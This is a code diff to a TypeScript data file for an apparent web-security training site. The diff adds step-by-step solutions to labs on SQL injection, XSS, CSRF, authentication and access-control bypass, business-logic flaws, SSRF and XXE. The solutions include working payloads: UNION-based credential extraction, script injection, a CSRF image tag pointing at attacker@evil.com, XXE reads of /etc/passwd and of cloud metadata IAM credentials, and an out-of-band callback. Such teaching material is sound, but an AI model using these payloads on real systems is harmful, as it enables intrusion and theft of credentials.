@@ -77,7 +77,8 @@ export const topics: Topic[] = [
           "Add more NULLs until no error",
           "' UNION SELECT NULL,NULL,NULL--",
           "3 columns found when query succeeds"
-        ]
+        ],
+        solution: "Try adding NULLs to a UNION SELECT statement until the error disappears. Payload: ' UNION SELECT NULL,NULL,NULL--. If the page loads correctly with 3 NULLs, the original query has 3 columns."
       },
       {
         id: 'sqli-4',
@@ -93,7 +94,8 @@ export const topics: Topic[] = [
           "' UNION SELECT username,password FROM users--",
           "Administrator credentials will appear",
           "Use them to login"
-        ]
+        ],
+        solution: "Use UNION to pull data from the users table. Payload: ' UNION SELECT username,password FROM users--. This will display the contents of the users table in the product list, revealing the admin password."
       }
     ]
   },
@@ -118,7 +120,8 @@ export const topics: Topic[] = [
           "No encoding is applied",
           "Script executes immediately",
           "Lab solved when alert triggers"
-        ]
+        ],
+        solution: "Inject a script tag into the search query parameter. Payload: /search?query=<script>alert(1)</script>. The server reflects this input directly into the HTML without sanitization."
       },
       {
         id: 'xss-2',
@@ -134,7 +137,8 @@ export const topics: Topic[] = [
           "Payload stored permanently",
           "Executes for all viewers",
           "Persistent XSS attack"
-        ]
+        ],
+        solution: "Submit a comment containing a script tag. Payload: <script>alert(document.domain)</script>. Since comments are saved and displayed back to users, the script will execute every time the page is loaded."
       },
       {
         id: 'xss-3',
@@ -150,7 +154,8 @@ export const topics: Topic[] = [
           'Use: "><script>alert(1)</script>',
           "Closes the tag first",
           "Then injects script"
-        ]
+        ],
+        solution: "Close the existing HTML tag attribute and inject a new script tag. Payload: \"><script>alert(1)</script>. This breaks out of the intended data context and into an execution context."
       }
     ]
   },
@@ -175,7 +180,8 @@ export const topics: Topic[] = [
           "Set email parameter",
           "Form submits on page load",
           "Email changed without user action"
-        ]
+        ],
+        solution: "Construct an HTML page that auto-submits a POST request to /change-email with a new email address. When a logged-in user visits your malicious page, their browser will send the request with their session cookies."
       },
       {
         id: 'csrf-2',
@@ -191,7 +197,8 @@ export const topics: Topic[] = [
           "Token not checked for GET",
           "Use: /change-email?email=attacker@evil.com",
           "Protection bypassed"
-        ]
+        ],
+        solution: "Convert the attack to a GET request. Instead of a form, use a simple link or image tag: <img src='/change-email?email=attacker@evil.com'>. If the server accepts GET for state-changing actions, the CSRF protection is bypassed."
       }
     ]
   },
@@ -216,7 +223,8 @@ export const topics: Topic[] = [
           "Invalid username: 'Invalid username'",
           "Valid username: 'Incorrect password'",
           "Username 'carlos' is valid"
-        ]
+        ],
+        solution: "Systematically test usernames. When you see 'Incorrect password' instead of 'Invalid username', you know the username exists. Try 'carlos' to see the difference."
       },
       {
         id: 'auth-2',
@@ -232,7 +240,8 @@ export const topics: Topic[] = [
           "Notice username parameter",
           "Change username to carlos",
           "Set new password for carlos"
-        ]
+        ],
+        solution: "Trigger a password reset for your own account, then intercept the final submission request and change the 'username' parameter from your name to 'carlos'. If the server doesn't re-validate the token, it will reset carlos's password."
       },
       {
         id: 'auth-3',
@@ -248,7 +257,8 @@ export const topics: Topic[] = [
           "Don't enter 2FA code",
           "Navigate directly to /my-account",
           "Access granted without 2FA"
-        ]
+        ],
+        solution: "Login with the known username and password. When prompted for the 2FA code, simply manually type /my-account into the address bar. If the session is already established before 2FA, you bypass the check."
       },
       {
         id: 'auth-4',
@@ -264,7 +274,8 @@ export const topics: Topic[] = [
           "Generate for common passwords",
           "Base64 encode results",
           "Use cookie to login"
-        ]
+        ],
+        solution: "Base64 decode the 'stay-logged-in' cookie to see its format (e.g., 'wiener:51102142273e913a483569485145558d'). The second part is an MD5 hash of the password. Brute force common passwords, MD5 them, and rebuild the cookie."
       }
     ]
   },
@@ -289,7 +300,8 @@ export const topics: Topic[] = [
           "Navigate to /administrator-panel",
           "No authentication required",
           "Delete carlos user"
-        ]
+        ],
+        solution: "Simply navigate to /administrator-panel. The server assumes you are authorized just by knowing the URL. Once inside, you can perform administrative actions like deleting users."
       },
       {
         id: 'access-2',
@@ -305,7 +317,8 @@ export const topics: Topic[] = [
           "Change roleid to 2",
           "Admin access granted",
           "Delete carlos user"
-        ]
+        ],
+        solution: "Intercept the request after logging in and look for a 'roleid' or 'isAdmin' parameter. Change roleid=1 to roleid=2. The server trusts the client-provided role value."
       },
       {
         id: 'access-3',
@@ -321,7 +334,8 @@ export const topics: Topic[] = [
           "Try id=carlos",
           "Access carlos data",
           "Retrieve API key"
-        ]
+        ],
+        solution: "Change the 'id' parameter in the URL /my-account?id=wiener to /my-account?id=carlos. If the server doesn't check if the requester owns the ID, you can view private data of any user."
       },
       {
         id: 'access-4',
@@ -337,7 +351,8 @@ export const topics: Topic[] = [
           "Step 2 doesn't validate",
           "Skip to step 2",
           "Privilege escalation!"
-        ]
+        ],
+        solution: "Identify the two requests used to change a role. The first checks permissions, but the second (the confirmation) might not. Skip the first request and send the second one directly with your target parameters."
       }
     ]
   },
@@ -362,7 +377,8 @@ export const topics: Topic[] = [
           "Price parameter is sent",
           "Change price to 0.01",
           "Purchase completed!"
-        ]
+        ],
+        solution: "Add an item to your cart and intercept the POST request. Change the 'price' parameter from 1337.00 to 0.01. The server trusts the price sent from the browser."
       },
       {
         id: 'business-2',
@@ -378,7 +394,8 @@ export const topics: Topic[] = [
           "quantity=-999",
           "Total becomes negative",
           "Checkout successful"
-        ]
+        ],
+        solution: "Add an expensive item to your cart. Then, add a cheap item but change its quantity to a large negative number (e.g., -999). This reduces the total cart value to almost zero or negative, allowing you to checkout for free."
       },
       {
         id: 'business-3',
@@ -394,7 +411,8 @@ export const topics: Topic[] = [
           "Change email to @dontwannacry.com",
           "Domain check after",
           "Admin panel accessible"
-        ]
+        ],
+        solution: "Register with a normal email. After logging in, use the 'change email' feature to set it to something like 'admin@dontwannacry.com'. If the domain check is only applied during the update and not strictly enforced, you gain admin privileges."
       },
       {
         id: 'business-4',
@@ -410,7 +428,8 @@ export const topics: Topic[] = [
           "username=administrator",
           "Endpoint accepts it",
           "Admin password changed!"
-        ]
+        ],
+        solution: "When changing your own password, add an extra parameter to the request: &username=administrator. If the backend uses a generic update function that takes all inputs, it might update the administrator's password instead of yours."
       }
     ]
   },
@@ -435,7 +454,8 @@ export const topics: Topic[] = [
           "Internal services accessible",
           "Admin panel found",
           "Delete carlos user"
-        ]
+        ],
+        solution: "Change the 'stockApi' parameter to http://localhost/admin. The server will fetch its own internal admin page and display it to you. Navigate to the delete user link shown in the response."
       },
       {
         id: 'ssrf-2',
@@ -451,7 +471,8 @@ export const topics: Topic[] = [
           "Look for different response",
           "Admin at 192.168.0.68",
           "Access internal admin"
-        ]
+        ],
+        solution: "The server can access other machines on its private network. Brute force the internal IP range (e.g., http://192.168.0.X:8080/admin) until you get a 200 OK response, indicating where the admin panel is located."
       },
       {
         id: 'ssrf-3',
@@ -467,7 +488,8 @@ export const topics: Topic[] = [
           "Use 127.1 short form",
           "Or use 127.0.0.1",
           "Blacklist bypassed!"
-        ]
+        ],
+        solution: "If 'localhost' is blacklisted, try using '127.0.0.1' or the decimal representation '2130706433'. Often, developers only block the literal string 'localhost'."
       }
     ]
   },
@@ -492,7 +514,8 @@ export const topics: Topic[] = [
           '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
           "Reference &xxe; in XML",
           "File contents returned"
-        ]
+        ],
+        solution: "Inject an external entity definition into the XML body: <!DOCTYPE test [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]>. Then reference &xxe; inside one of the XML tags. The server will replace it with the file contents."
       },
       {
         id: 'xxe-2',
@@ -508,7 +531,8 @@ export const topics: Topic[] = [
           "http://169.254.169.254/...",
           "Retrieve IAM credentials",
           "Sensitive data exposed"
-        ]
+        ],
+        solution: "Instead of a file path, use a URL in the entity definition: <!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin'>. The server will make the HTTP request and return the result."
       },
       {
         id: 'xxe-3',
@@ -524,7 +548,8 @@ export const topics: Topic[] = [
           "External entity to your server",
           "Monitor HTTP/DNS requests",
           "Confirm XXE via logs"
-        ]
+        ],
+        solution: "Define an entity that points to your own server: <!ENTITY xxe SYSTEM 'http://your-server.com/log'>. If you see a request in your server logs, you've confirmed the XXE vulnerability even though the app didn't show the output."
       }
     ]
   }
